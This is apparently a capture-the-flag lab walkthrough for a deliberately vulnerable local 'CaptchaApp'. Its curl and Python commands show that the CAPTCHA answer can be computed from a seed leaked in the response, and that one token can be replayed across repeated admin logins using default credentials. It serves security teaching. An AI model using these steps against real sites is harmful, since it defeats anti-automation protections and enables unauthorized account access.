# Finding the Bug

## Step 1: Confirm the lab is running

```
curl -s http://127.0.0.1:8111/
```

You should see a home page mentioning CaptchaApp v2.1.

## Step 2: Fetch the CAPTCHA

```
curl -s http://127.0.0.1:8111/captcha
```

Response:

```json
{
  "token": "a1b2c3d4e5f60718",
  "challenge": "Solve: MD5(captcha-seed-2024)[:6]",
  "flag1": "POC{...}"
}
```

The `challenge` field tells you exactly what to compute. The seed `captcha-seed-2024` is disclosed in plaintext. Bug 1 is confirmed: anyone who reads this response can compute the answer.

## Step 3: Confirm token replay

Fetch a token and use it twice:

```
TOKEN=$(curl -s http://127.0.0.1:8111/captcha | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
ANSWER=$(python3 -c "import hashlib; print(hashlib.md5(b'captcha-seed-2024').hexdigest()[:6])")

# First use
curl -s -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"password\":\"admin123\",\"captcha_token\":\"$TOKEN\",\"captcha_answer\":\"$ANSWER\"}" \
  http://127.0.0.1:8111/login

# Second use - same token, should still work
curl -s -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"password\":\"admin123\",\"captcha_token\":\"$TOKEN\",\"captcha_answer\":\"$ANSWER\"}" \
  http://127.0.0.1:8111/login
```

Both requests succeed. Bug 2 is confirmed: tokens are never invalidated.
